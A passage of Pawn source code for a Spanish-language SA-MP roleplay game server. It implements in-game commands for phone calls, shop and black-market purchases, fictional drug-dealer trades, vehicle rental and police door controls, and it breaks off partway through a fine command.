CMD:colgar(playerid, params[])
{
	new caller = Mobile[playerid];

	if(PhoneHand[playerid] == 0)
	    return SendClientMessage(playerid, COLOR_YELLOW2, "No tienes tu celular en la mano.");
	if(PlayerCancelMissionEvent(playerid))
	    return 1;
	    
	if(IsPlayerConnected(caller) && caller != INVALID_PLAYER_ID && caller != 255)
	{
		if(caller < 255)
		{
		    PlayerDoMessage(playerid, 15.0, "Han colgado...");
		    PlayerDoMessage(caller, 15.0, "Han colgado...");
			if(!IsPlayerInAnyVehicle(playerid))
				SetPlayerSpecialAction(playerid, SPECIAL_ACTION_STOPUSECELLPHONE);
			if(!IsPlayerInAnyVehicle(caller))
				SetPlayerSpecialAction(caller, SPECIAL_ACTION_STOPUSECELLPHONE);
			PlayerActionMessage(playerid,15.0,"cuelga y guarda su tel�fono celular en el bolsillo.");
			PlayerActionMessage(caller,15.0,"cuelga y guarda su tel�fono celular en el bolsillo.");
			Mobile[caller] = 255;
			if(StartedCall[playerid]) {
			    //TODO: Implementar tiempo de llamada
				new callcost = random(PRICE_CALL);
				GivePlayerCash(playerid,-callcost);
				Business[PlayerInfo[playerid][pPhoneC]][bTill] += callcost;
				StartedCall[playerid] = 0;
			}
			else if(StartedCall[caller]) {
			    //TODO: Implementar tiempo de llamada
				new callcost = random(PRICE_CALL);
				GivePlayerCash(caller,-callcost);
				Business[PlayerInfo[caller][pPhoneC]][bTill] += callcost;
				StartedCall[caller] = 0;
			}
		}
		Mobile[playerid] = 255;
		return 1;
	}
	return 1;
}


CMD:llamar(playerid, params[])
{
	new workers, number, contact;

    if(sscanf(params, "i", number))
		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /llamar [n�mero de tel�fono]");
	if(PlayerInfo[playerid][pPhoneNumber] == 0)
		return SendClientMessage(playerid, COLOR_YELLOW2, "�No puedes realizar una llamada si no tienes un tel�fono!");
	if(PhoneHand[playerid] == 0)
	    return SendClientMessage(playerid, COLOR_YELLOW2, "No tienes tu celular en la mano.");
	if(!PhoneEnabled[playerid])
		return SendClientMessage(playerid, COLOR_YELLOW2, "Tienes el tel�fono apagado. Utiliza '/toggle telefono' para encenderlo.");
	if(Mobile[playerid] != 255)
		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} ya te encuentras en una llamada.");
	if(number == PlayerInfo[playerid][pPhoneNumber])
		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} la l�nea est� siendo utilizada.");
	if(number == 0)
	    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} n�mero inv�lido.");
	
	PlayerActionMessage(playerid, 15.0, "toma un tel�fono celular de su bolsillo y marca un n�mero.");
	
	if(number == 911)
	{
		Mobile[playerid] = 911;
		SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "Emergencias: �que servicio solicita, policia o paramedico?");
		return 1;
	}
	
	if(number == 555)
	{
		foreach(new i : Player)
		{
			if(PlayerInfo[i][pFaction] == FAC_MECH && jobDuty[i])
				workers++;
		}
		if(workers < 1)
  			return SendClientMessage(playerid, COLOR_WHITE, "Telefonista: lo sentimos, no hay mecanicos disponibles por el momento.");

		Mobile[playerid] = 555;
		SendClientMessage(playerid, COLOR_WHITE, "Telefonista: taller mec�nico de Malos Aires, �en qu� le podemos ayudar?");
		return 1;
	}
	
	if(number == 444)
	{
 		if(jobDuty[playerid] && PlayerInfo[playerid][pJob] == JOB_TAXI)
   			return SendClientMessage(playerid, COLOR_YELLOW2, "�No puedes hacerlo mientras te encuentras en servicio como taxista!");

		foreach(new i : Player)
		{
			if(PlayerInfo[i][pJob] == JOB_TAXI && jobDuty[i])
				workers++;
		}
		if(workers < 1)
			return SendClientMessage(playerid, COLOR_WHITE, "Telefonista: lo sentimos, no hay veh�culos disponibles por el momento.");

		Mobile[playerid] = 444;
		SendClientMessage(playerid, COLOR_WHITE, "Telefonista: transporte urbano de Malos Aires, �en qu� le podemos ayudar?");
		return 1;
	}
	
	foreach(new i : Player)
	{
		if(PlayerInfo[i][pPhoneNumber] == number)
		{
    		if(!PhoneEnabled[i] || PlayerInfo[i][pSpectating] != INVALID_PLAYER_ID)
		    	return SendClientMessage(playerid, COLOR_WHITE, "Operadora dice: el tel�fono al que intenta comunicarse se encuentra fuera de l�nea.");
			if(Mobile[i] != 255)
			    return SendClientMessage(playerid, COLOR_YELLOW2, "La linea se encuentra ocupada.");

			Mobile[playerid] = i;
			PlayerDoMessage(i, 15.0, "Un tel�fono ha comenzado a sonar.");

			contact = IsNumberInNotebook(i, PlayerInfo[playerid][pPhoneNumber]);
			if(contact != -1)
				SendFMessage(i, COLOR_WHITE, "Tienes una llamada de %s, utiliza /atender o /colgar.", GetNotebookContactName(i, contact));
			else
				SendFMessage(i, COLOR_WHITE, "Tienes una llamada del %d, utiliza /atender o /colgar.", PlayerInfo[playerid][pPhoneNumber]);
            StartedCall[playerid] = 1;
            StartedCall[i] = 0;
            if(!IsPlayerInAnyVehicle(playerid))
				SetPlayerSpecialAction(playerid, SPECIAL_ACTION_USECELLPHONE);
			return 1;
		}
	}
	return 1;
}

CMD:vender(playerid, params[])
{
	// Mercado Negro
	if(IsAtBlackMarket(playerid))
	{
	    new item = GetHandItem(playerid, HAND_RIGHT);
	    
		if(item == 0)
		    return SendClientMessage(playerid, COLOR_YELLOW2, "No tienes nada en tus mano derecha para vender.");
		if(item != ITEM_ID_REPUESTOAUTO && item != ITEM_ID_BARRETA && item != ITEM_ID_PRODUCTOS && item != ITEM_ID_MATERIALES && GetItemType(item) != ITEM_TOY)
		    return SendClientMessage(playerid, COLOR_WHITE, "Comprador: No estoy interesado.");

    	GivePlayerCash(playerid, GetItemPrice(item) * GetHandParam(playerid, HAND_RIGHT) / 2); // Paga el 50% del valor original
		SendFMessage(playerid, COLOR_WHITE, "Comprador: Bien, te dar� $%d por tu %s - %s: %d", GetItemPrice(item) * GetHandParam(playerid, HAND_RIGHT) / 2, GetItemName(item), GetItemParamName(item), GetHandParam(playerid, HAND_RIGHT));
		PlayerActionMessage(playerid, 15.0, "realiza un intercambio de un paquete desconocido con un sujeto.");
		SetHandItemAndParam(playerid, HAND_RIGHT, 0, 0);
		return 1;
	}
	return 1;
}

CMD:comprar(playerid, params[])
{
	new title[64], content[600], business = GetPlayerBusiness(playerid);

	if(GetPVarInt(playerid, "disabled") != DISABLE_NONE)
	    return SendClientMessage(playerid, COLOR_YELLOW2, "No puedes hacerlo en este momento.");

	if(business != 0)
	{
	    switch(Business[business][bType])
	    {
	        case BIZ_247:
			{
			    if(Business[business][bProducts] <= 0)
		     		return SendClientMessage(playerid, COLOR_YELLOW2, "El negocio no tiene stock de productos. Intenta volviendo mas tarde.");
				format(title, sizeof(title), "%s", Business[business][bName]);
				format(content, sizeof(content), "{FFEFD5}Aspirina {556B2F}$%d\n{FFEFD5}Cigarrillos 20u. {556B2F}$%d\n{FFEFD5}Encendedor {556B2F}$%d\n{FFEFD5}Tel�fono {556B2F}$%d\n{FFEFD5}Bid�n de combustible vac�o {556B2F}$%d\n{FFEFD5}C�mara (35 fotos) {556B2F}$%d\n{FFEFD5}S�ndwich {556B2F}$%d\n{FFEFD5}Agua Mineral {556B2F}$%d\n{FFEFD5}Malet�n {556B2F}$%d\n{FFEFD5}Radio Walkie Talkie {556B2F}$%d",
		            PRICE_ASPIRIN,
					PRICE_CIGARETTES,
					PRICE_LIGHTER,
					PRICE_PHONE,
					GetItemPrice(ITEM_ID_BIDON),
					GetItemPrice(ITEM_ID_CAMARA) * 35,
					GetItemPrice(ITEM_ID_SANDWICH),
					GetItemPrice(ITEM_ID_AGUAMINERAL),
					GetItemPrice(ITEM_ID_MALETIN),
					PRICE_RADIO

				);
		        TogglePlayerControllable(playerid, false);
		        ShowPlayerDialog(playerid, DLG_247, DIALOG_STYLE_LIST, title, content, "Comprar", "Cerrar");
			}
			case BIZ_ACCESS:
			{
			    OnPlayerBuyAccess(playerid, business);
			    return 1;
			}
			case BIZ_AMMU:
			{
			    OnPlayerBuyAmmu(business, playerid, params);
			    return 1;
			}
			case BIZ_CLOT, BIZ_CLOT2:
			{
				OnPlayerBuyClot(business, playerid);
				return 1;
    		}
			case BIZ_HARD:
			{
		        OnPlayerBuyHard(playerid, business);
		        return 1;
			}
			case BIZ_PHON:
			{
			    TogglePlayerControllable(playerid, false);
				ShowMenuForPlayer(phoneMenu, playerid);
			}
		}
		
	}
	else if(business == 0)
	{
		if(PlayerToPoint(4.0, playerid, 2333.2856, -1948.3102, 13.5783))
		{
			if(PlayerInfo[playerid][pJob] == JOB_DRUGD)
			{
				new amount,
					type,
					hand = SearchHandsForItem(playerid, ITEM_ID_MATERIAPRIMA),
					handparam;

				if(sscanf(params, "ii", type, amount))
				{
	                SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /comprar [tipo] [cant de bolsas de mat. prima a canjear]");
			        SendClientMessage(playerid, COLOR_YELLOW2, "1: Marihuana - 5 grs. por cada bolsa de materia prima.");
			        SendClientMessage(playerid, COLOR_YELLOW2, "2: LSD - 4 grs. por cada bolsa de materia prima.");
			        SendClientMessage(playerid, COLOR_YELLOW2, "3: Extasis - 3 grs. por cada bolsa de materia prima.");
			        SendClientMessage(playerid, COLOR_YELLOW2, "4: Coca�na - 2 grs. por cada bolsa de materia prima.");
					return 1;
				}
				if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT)
			    	return SendClientMessage(playerid, COLOR_YELLOW2, "Debes estar a pie.");
				if(hand == -1)
					return SendClientMessage(playerid, COLOR_YELLOW2, "Debes tener una bolsa de materia prima en tus manos para canjear.");
				if(type < 1 || type > 4)
					return SendClientMessage(playerid, COLOR_YELLOW2, "Tipo de droga inv�lido.");
     			if(amount < 1 || amount > 5)
			    	return SendClientMessage(playerid, COLOR_YELLOW2, "La cantidad de bolsas a canjear no debe ser menor a 1 o mayor a 5.");
				handparam = GetHandParam(playerid, hand);
                if(handparam < amount)
                    return SendClientMessage(playerid, COLOR_YELLOW2, "No dispones de suficiente materia prima en la mano para canjear.");
					
				switch(type)
				{
				    case 1:
					{
						if(PlayerInfo[playerid][pCantWork] + 5 * amount > MAX_DRUG_PURCHASE_PAYDAY)
						{
			   				SendFMessage(playerid, COLOR_YELLOW2, "Sujeto: �Te piensas que soy una f�brica? Ya te he vendido %d grs hoy y solo puedo hacer %d grs por d�a. Vuelve ma�ana y tendr� m�s.", PlayerInfo[playerid][pCantWork], MAX_DRUG_PURCHASE_PAYDAY);
							return 1;
						}
						PlayerInfo[playerid][pMarijuana] += 5 * amount;
						PlayerInfo[playerid][pCantWork] += 5 * amount;
						SendFMessage(playerid, COLOR_LIGHTBLUE, "Has comprado %d gramos de marihuana por %d bolsas de materia prima.", 5 * amount, amount);
					}
				    case 2:
					{
						if(PlayerInfo[playerid][pCantWork] + 4 * amount > MAX_DRUG_PURCHASE_PAYDAY)
						{
			   				SendFMessage(playerid, COLOR_YELLOW2, "Sujeto: �Te piensas que soy una f�brica? Ya te he vendido %d grs hoy y solo puedo hacer %d grs por d�a. Vuelve ma�ana y tendr� m�s.", PlayerInfo[playerid][pCantWork], MAX_DRUG_PURCHASE_PAYDAY);
							return 1;
						}
						PlayerInfo[playerid][pLSD] += 4 * amount;
						PlayerInfo[playerid][pCantWork] += 4 * amount;
						SendFMessage(playerid, COLOR_LIGHTBLUE, "Has comprado %d dosis de LSD por %d bolsas de materia prima.", 4 * amount, amount);
					}
				    case 3:
					{
						if(PlayerInfo[playerid][pCantWork] + 3 * amount > MAX_DRUG_PURCHASE_PAYDAY)
						{
			   				SendFMessage(playerid, COLOR_YELLOW2, "Sujeto: �Te piensas que soy una f�brica? Ya te he vendido %d grs hoy y solo puedo hacer %d grs por d�a. Vuelve ma�ana y tendr� m�s.", PlayerInfo[playerid][pCantWork], MAX_DRUG_PURCHASE_PAYDAY);
							return 1;
						}
						PlayerInfo[playerid][pEcstasy] += 3 * amount;
						PlayerInfo[playerid][pCantWork] += 3 * amount;
						SendFMessage(playerid, COLOR_LIGHTBLUE, "Has comprado %d dosis de �xtasis por %d bolsas de materia prima.", 3 * amount, amount);
				    }
					case 4:
					{
						if(PlayerInfo[playerid][pCantWork] + 2 * amount > MAX_DRUG_PURCHASE_PAYDAY)
						{
			   				SendFMessage(playerid, COLOR_YELLOW2, "Sujeto: �Te piensas que soy una f�brica? Ya te he vendido %d grs hoy y solo puedo hacer %d grs por d�a. Vuelve ma�ana y tendr� m�s.", PlayerInfo[playerid][pCantWork], MAX_DRUG_PURCHASE_PAYDAY);
							return 1;
						}
						PlayerInfo[playerid][pCocaine] += 2 * amount;
						PlayerInfo[playerid][pCantWork] += 2 * amount;
						SendFMessage(playerid, COLOR_LIGHTBLUE, "Has comprado %d gramos de coca�na por %d bolsas de materia prima.", 2 * amount, amount);
					}
 				}
 				if(handparam == amount)
 					SetHandItemAndParam(playerid, hand, 0, 0);
				else
				    SetHandItemAndParam(playerid, hand, ITEM_ID_MATERIAPRIMA, handparam - amount);
                PlayerActionMessage(playerid, 15.0, "realiza un intercambio de paquetes con un sujeto");
			}

	 	}
		else if(PlayerToPoint(1.0, playerid, -1060.9709, -1195.5382, 129.6939))
		{
			if(PlayerInfo[playerid][pJob] == JOB_DRUGD)
			{
		        new amount, freehand = SearchFreeHand(playerid);
		        
				if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT)
			    	return SendClientMessage(playerid, COLOR_YELLOW2, "Debes estar a pie.");
                if(sscanf(params, "i", amount))
                {
	                SendFMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /comprar [cantidad] | $%d la unidad.", GetItemPrice(ITEM_ID_MATERIAPRIMA));
					return 1;
				}
				if(freehand == -1)
					return SendClientMessage(playerid, COLOR_YELLOW2, "Tienes ambas manos ocupadas y no puedes agarrar las bolsas de materia prima.");
				if(amount < 1 || amount > 5)
    				return SendClientMessage(playerid, COLOR_YELLOW2, "La cantidad de bolsas de materia prima no debe ser menor a 1 o mayor a 5.");
				if(ServerInfo[sDrugRawMats] < amount)
				{
				    SendFMessage(playerid, COLOR_YELLOW2, "No hay suficiente materia prima en la granja. Materia prima actual: %d.", ServerInfo[sDrugRawMats]);
					return 1;
				}
				if(GetPlayerCash(playerid) < amount * GetItemPrice(ITEM_ID_MATERIAPRIMA))
				{
			        SendFMessage(playerid, COLOR_YELLOW2, "No tienes el dinero suficiente, necesitas $%d.", amount * GetItemPrice(ITEM_ID_MATERIAPRIMA));
    				return 1;
    			}
    			
    			ServerInfo[sDrugRawMats] -= amount;
				SetPlayerCheckpoint(playerid, 2333.2856, -1948.3102, 13.5783, 5.4);
    			SetPlayerSpecialAction(playerid, SPECIAL_ACTION_CARRY);
    			SetHandItemAndParam(playerid, freehand, ITEM_ID_MATERIAPRIMA, amount);
    			PlayerActionMessage(playerid, 15.0, "compra unas bolsas de materia prima");
       			GivePlayerCash(playerid, -amount * GetItemPrice(ITEM_ID_MATERIAPRIMA));
				SendClientMessage(playerid, COLOR_WHITE, "V� al punto de venta y tipea /comprar para cambiar las bolsas por droga. Usa /nocargar para borrar la animaci�n de carga.");
		    }
		}
		else if(IsAtBlackMarket(playerid))
		{
			new item, option, cant, freehand = SearchFreeHand(playerid);

			if(sscanf(params, "ii", option, cant))
			{
				SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /comprar [Item] [Cantidad]");
				SendFMessage(playerid, COLOR_LIGHTYELLOW2, " 1) Barreta - $%d", GetItemPrice(ITEM_ID_BARRETA));
				return 1;
			}
			if(freehand == -1)
		   		return SendClientMessage(playerid, COLOR_YELLOW2, "Tienes ambas manos ocupadas y no puedes agarrar el item.");
			if(cant < 1 || cant > 5)
			    return SendClientMessage(playerid, COLOR_YELLOW2, "No puedes comprar menos de 1 o mas de 5.");
   			switch(option)
   			{
   			    case 1: item = ITEM_ID_BARRETA;
   			    default: return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /comprar [Item] [Cantidad]");
			}
			if(GetPlayerCash(playerid) < GetItemPrice(item) * cant)
			    return SendClientMessage(playerid, COLOR_WHITE, "Vendedor: Tomatela de ac� y volv� cuando tengas el dinero.");

			SetHandItemAndParam(playerid, freehand, item, cant);
			GivePlayerCash(playerid, -GetItemPrice(item) * cant);
			return 1;
		}
	}
	return 1;
}

CMD:nocargar(playerid, params[])
{
	if(GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_CARRY)
	    SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
	return 1;
}

CMD:licencias(playerid, params[])
{
	if(PlayerToPoint(4.0, playerid, -2033.2118, -117.4678, 1035.1719))
	{
		TogglePlayerControllable(playerid, false);
		ShowMenuForPlayer(licenseMenu, playerid);
	}
	return 1;
}

CMD:empleos(playerid, params[])
{
	if(PlayerToPoint(4.0, playerid, 361.8299, 173.4907, 1008.3828))
	{
		TogglePlayerControllable(playerid, false);
		ShowPlayerDialog(playerid, DLG_JOBS, DIALOG_STYLE_LIST, "Empleos de Malos Aires", "Empleo de mecanico\nEmpleo de taxista\nEmpleo de granjero\nEmpleo de transportista\nEmpleo de basurero", "Ver", "Cerrar");
	}
	return 1;
}

CMD:guia(playerid, params[])
{
	for(new i = 0; i < sizeof(P_GUIDE); i++)
	{
        if(PlayerToPoint(4.0, playerid, GUIDE_POS[i][0], GUIDE_POS[i][1], GUIDE_POS[i][2]))
		{
			TogglePlayerControllable(playerid, false);
            ShowPlayerDialog(playerid, DLG_GUIDE, DIALOG_STYLE_LIST, "Gu�a de Malos Aires", "Alquiler de vehiculos\nCentro de licencias\nCentro de empleos\nTienda de ropa urbana\nTienda de ropa fina\nMercado de Malos Aires", "Ver", "Cerrar");
		}
	}
	return 1;
}

CMD:manuales(playerid, params[])
{
	new option;

    if(PlayerToPoint(4.0, playerid, -2033.2118, -117.4678, 1035.1719))
	{
        if(sscanf(params, "d", option))
		{
			SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /manuales [licencia]");
			SendClientMessage(playerid, COLOR_WHITE, "1: licencia de conducci�n.");
			SendClientMessage(playerid, COLOR_WHITE, "2: licencia de navegaci�n.");
			SendClientMessage(playerid, COLOR_WHITE, "3: licencia de vuelo.");
		}
		else
		{
		    switch(option)
			{
		        case 1:
				{
          			SendClientMessage(playerid, COLOR_WHITE, " ");
          			SendClientMessage(playerid, COLOR_WHITE, "---------------------");
		            SendClientMessage(playerid, COLOR_YELLOW2, "Manual de conducci�n:");
		            SendClientMessage(playerid, COLOR_WHITE, "- (1) Deber� conducir a 50 KM/H en calles y no m�s de 70 KM/H en avenidas.");
		            SendClientMessage(playerid, COLOR_WHITE, "- (2) Deber� respetar todo sem�foro.");
		            SendClientMessage(playerid, COLOR_WHITE, "- (3) Deber� conducir siempre por el carril derecho.");
                    SendClientMessage(playerid, COLOR_WHITE, "- (3-bis) En el caso de tener que pasar a otro veh�culo podr� emplearse el carril de la izquierda.");
                    SendClientMessage(playerid, COLOR_WHITE, "- (4) No emplear� la bocina para generar disturbios ni molestar a los ciudadanos.");
                    SendClientMessage(playerid, COLOR_WHITE, "- (5) Respetar� la direcci�n de los carriles.");
                    SendClientMessage(playerid, COLOR_WHITE, "- (6) Los peatones tienen prioridad para cruzar en las esquinas.");
                    SendClientMessage(playerid, COLOR_YELLOW2, "De no respetar alguna de las normas podr� ser multado por una suma de entre $100 a $30,000 seg�n la gravedad.");
		        }
		        default:
				{
		            SendClientMessage(playerid, COLOR_YELLOW2, "El manual que intent� leer no existe o bien la licencia no se encuentra disponible actualmente.");
		        }
		    }
		}
	}
	return 1;
}

CMD:cla(playerid, params[])
{
	cmd_clasificado(playerid, params);
	return 1;
}

CMD:clasificado(playerid,params[])
{
	new text[128], string[128], adminstring[128];

	if(gPlayerLogged[playerid] != 1)
		return 1;
    if(sscanf(params, "s[128]", text))
		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} (/cla)sificado [texto - 64 car�cteres] $80");
    if(PlayerInfo[playerid][pLevel] < 2)
		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2,"Debes ser al menos nivel 2 para enviar un anuncio.");
    if(AllowAdv[playerid] != 1)
        return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "Espere 60 segundos antes de enviar otro anuncio.");
    if(GetPlayerCash(playerid) < PRICE_ADVERTISE)
	{
    	SendFMessage(playerid, COLOR_YELLOW2, "No tienes el dinero suficiente, necesitas $%d.", PRICE_ADVERTISE);
		return 1;
	}

	GivePlayerCash(playerid, -PRICE_ADVERTISE);
	format(string, sizeof(string), "Descontados $%d", PRICE_ADVERTISE);
	GameTextForPlayer(playerid, string, 1400, 5);
	SetTimerEx("AllowAd", 60000, false, "i", playerid);
	AllowAdv[playerid] = 0;
	format(adminstring, sizeof(adminstring), "[%d] Publicidad: %s", playerid, text);
	format(string, sizeof(string), "Publicidad: %s", text);
	foreach(new i : Player)
	{
		if(PlayerInfo[i][pAdmin] >= 1)
			SendClientMessage(i, COLOR_ADVERTISMENT, adminstring);
		else
			SendClientMessage(i, COLOR_ADVERTISMENT, string);
	}
	GiveFactionMoney(FAC_MAN, PRICE_ADVERTISE);
	printf("[Anuncio] %s: %s", GetPlayerNameEx(playerid), text);
	return 1;
}

//=============================RENTA DE VEHICULOS===============================

CMD:rentar(playerid, params[])
{
	new vehicleid, rentcarid, price, time;

	if(sscanf(params, "i", time))
	    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /rentar [tiempo] (en horas)");
	if(PlayerInfo[playerid][pRentCarID] != 0)
	    return SendClientMessage(playerid, COLOR_YELLOW2, "�Ya has rentado un veh�culo!");
	if(!IsPlayerInAnyVehicle(playerid))
	    return SendClientMessage(playerid, COLOR_YELLOW2, "Debes estar subido a un veh�culo de renta disponible para alquilar.");
 	vehicleid = GetPlayerVehicleID(playerid);
	if(VehicleInfo[vehicleid][VehType] != VEH_RENT)
	    return SendClientMessage(playerid, COLOR_YELLOW2, "Debes estar subido a un veh�culo de renta disponible para alquilar.");
	for(new i = 1; i < MAX_RENTCAR; i++)
	{
	    if(RentCarInfo[i][rVehicleID] == vehicleid)
		{
	        if(RentCarInfo[i][rRented] == 1)
	            return SendClientMessage(playerid, COLOR_YELLOW2, "Debes estar subido a un veh�culo de renta disponible para alquiler.");
			else
		    {
		        rentcarid = i;
		    	break;
			}
		}
	}
	if(time < 1 || time > 3)
	    return SendClientMessage(playerid, COLOR_YELLOW2, "Solo puedes alquilar por un m�nimo de una hora, o un m�ximo de tres.");
	price = (GetVehiclePrice(vehicleid, ServerInfo[sVehiclePricePercent])) / 200;
	if(price < 100)
		price = 100; // Seteamos un m�nimo de precio
	if(GetPlayerCash(playerid) < price * time)
    	return SendClientMessage(playerid, COLOR_YELLOW2, "No tienes el dinero necesario.");

	GivePlayerCash(playerid, -(price * time));
	SendClientMessage(playerid, COLOR_WHITE, "�Has rentado el veh�culo! Utiliza '/motor' o la tecla Y para encenderlo. El veh�culo ser� devuelto al acabarse el tiempo.");
    SendClientMessage(playerid, COLOR_WHITE, "(( Si el veh�culo respawnea, lo encontrar�s en la agencia donde lo rentaste en primer lugar. ))");
	RentCarInfo[rentcarid][rRented] = 1;
	RentCarInfo[rentcarid][rOwnerSQLID] = PlayerInfo[playerid][pID];
	RentCarInfo[rentcarid][rTime] = time * 60; // Guardamos el tiempo en minutos
	PlayerInfo[playerid][pRentCarID] = vehicleid;
	PlayerInfo[playerid][pRentCarRID] = rentcarid;
	return 1;
}

TIMER:rentRespawn()
{
	new ownerid;
	for(new i = 1; i < MAX_RENTCAR; i++)
	{
		if(RentCarInfo[i][rRented] == 1)
		{
 		    RentCarInfo[i][rTime] -= 20;
            if(RentCarInfo[i][rTime] < 30)
            {
                ownerid = -1; // Por default el -1 que significa no est� conectado
	           	foreach(new playerid : Player)
			    {
			        if(PlayerInfo[playerid][pID] == RentCarInfo[i][rOwnerSQLID])
			        {
			            ownerid = playerid;
			            break;
					}
				}
				if(RentCarInfo[i][rTime] > 0 && ownerid != 1)
 					SendFMessage(ownerid, COLOR_WHITE, "A tu veh�culo de renta le quedan %d minutos de alquiler. Al finalizar ser� devuelto a la agencia.", RentCarInfo[i][rTime]);
				if(RentCarInfo[i][rTime] <= 0)
				{
				    RentCarInfo[i][rRented] = 0;
				    RentCarInfo[i][rTime] = 0;
				    RentCarInfo[i][rOwnerSQLID] = 0;
				    if(ownerid != -1)
				    {
       					PlayerInfo[ownerid][pRentCarID] = 0;
						PlayerInfo[ownerid][pRentCarRID] = 0;
						SendClientMessage(ownerid, COLOR_WHITE, "Se ha acabado el tiempo de alquiler del veh�culo de renta.");
				    }
				}
			}
		}
    	if(RentCarInfo[i][rRented] == 0)
    	{
			VehicleInfo[RentCarInfo[i][rVehicleID]][VehLocked] = 0;
			SetVehicleToRespawn(RentCarInfo[i][rVehicleID]);
			VehicleInfo[RentCarInfo[i][rVehicleID]][VehFuel] = 100;
		}
	}
	return 1;
}

//===============================COMANDOS DE PMA================================

CMD:ayudap(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] != FAC_PMA)
		return 1;
		
	SendClientMessage(playerid,COLOR_LIGHTYELLOW2,"[Polic�a Metropolitana]:");
	SendClientMessage(playerid,COLOR_LIGHTYELLOW2,"/apuerta /pequipo /propero /pservicio /pchaleco /sosp /r /megafono /arrestar /esposar /quitaresposas /revisar /cono /barricada /camaras");
 	SendClientMessage(playerid,COLOR_LIGHTYELLOW2,"/tomartazer /guardartazer /quitar /multar /mecremolcar /arrastrar /refuerzos /ultimallamada /vercargos /buscados /localizar /pipeta");
    if(PlayerInfo[playerid][pRank] <= 3)
        SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "/verregistros /comprarinsumos /guardarinsumos");
	if(PlayerInfo[playerid][pRank] <= 4)
        SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "[Inspector]: /geof");
	return 1;
}

CMD:apuerta(playerid,params[]) {

    // Polic�a de Malos Aires
	if(PlayerInfo[playerid][pFaction] == FAC_PMA || AdminDuty[playerid] == 1) {

		if(IsPlayerInRangeOfPoint(playerid, 4.0, 228.1902, 151.2390, 1003.0037)) {
			// PM Puerta que da para el interior del edificio izq
			if(PMHallDoor[0] == 0) {
			    PMHallDoor[0] = 1;
				MoveObject(PMHallDoor[1], 228.2500, 149.3694, 1003.2724, 1.00, 0.00, 0.00, -90.00);
            	MoveObject(PMHallDoor[2], 228.2500, 153.1094, 1003.2724, 1.00, 0.00, 0.00, 90.00);
			} else {
			    PMHallDoor[0] = 0;
			    MoveObject(PMHallDoor[1], 228.25000, 150.34940, 1003.27240, 1.00, 0.00, 0.00, -90.00);
            	MoveObject(PMHallDoor[2], 228.25000, 152.08940, 1003.27240, 1.00, 0.00, 0.00, 90.00);//
			}
        } else if(IsPlayerInRangeOfPoint(playerid, 4.0, 209.1759, 178.1573, 1003.0037)) {
			// PM Puerta antes de los calabozos
			if(PMWindow[0] == 0) {
			    PMWindow[0] = 1;
				MoveObject(PMWindow[1], 209.1675, 176.5160, 1003.2724, 1.00, 0.00, 0.00, 90.00);
			} else {
			    PMWindow[0] = 0;
			    MoveObject(PMWindow[1], 209.1675, 178.2560, 1003.2724, 1.00, 0.00, 0.00, 90.00);
			}
        } else if(IsPlayerInRangeOfPoint(playerid, 4.0, 204.5319, 173.0026, 1003.0037)) {
            // PM Puerta principal de la c�rcel
			if(PMJailMainDoor[0] == 0) {
			    PMJailMainDoor[0] = 1;
			 	MoveObject(PMJailMainDoor[1], 204.5757, 171.3780, 1003.2724, 1.00, 0.00, 0.00, 90.00);
			} else {
				PMJailMainDoor[0] = 0;
				MoveObject(PMJailMainDoor[1], 204.57574, 173.07796, 1003.27240, 1.00, 0.00, 0.00, 90.00);
			}
		} else if(IsPlayerInRangeOfPoint(playerid, 2.0, 197.9036, 176.9503, 1003.0037)) {
            // PM C�rcel 1
			if(PMJail1[0] == 0) {
				PMJail1[0] = 1;
			 	MoveObject(PMJail1[1], 198.8660, 177.0215, 1003.2745, 1.00, 0.00, 0.00, 0.00);
			} else {
				PMJail1[0] = 0;
				MoveObject(PMJail1[1], 197.18600, 177.02150, 1003.27448, 1.00, 0.00, 0.00, 0.00);
			}
		} else if(IsPlayerInRangeOfPoint(playerid, 2.0, 193.7019, 177.0232, 1003.0037)) {
            // PM C�rcel 2
			if(PMJail2[0] == 0) {
			    PMJail2[0] = 1;
			 	MoveObject(PMJail2[1], 194.6260, 177.0215, 1003.2745, 1.00, 0.00, 0.00, 0.00);
			} else {
				PMJail2[0] = 0;
				MoveObject(PMJail2[1], 192.94600, 177.02150, 1003.27448, 1.00, 0.00, 0.00, 0.00);
			}
		} else if(IsPlayerInRangeOfPoint(playerid, 2.0, 189.5194, 177.0389, 1003.0037)) {
            // PM C�rcel 3
			if(PMJail3[0] == 0) {
				PMJail3[0] = 1;
			 	MoveObject(PMJail3[1], 190.4260, 177.0215, 1003.2745, 1.00, 0.00, 0.00, 0.00);
			} else {
				PMJail3[0] = 0;
				MoveObject(PMJail3[1], 188.70599, 177.02150, 1003.27448, 1.00, 0.00, 0.00, 0.00);
			}
		}
	}
}

CMD:multar(playerid, params[])
{
    new reason[64], cost, targetID;

  	if(PlayerInfo[playerid][pFaction] != FAC_PMA)
	  	return 1;
	if(sscanf(params, "uds[64]", targetID, cost, reason))
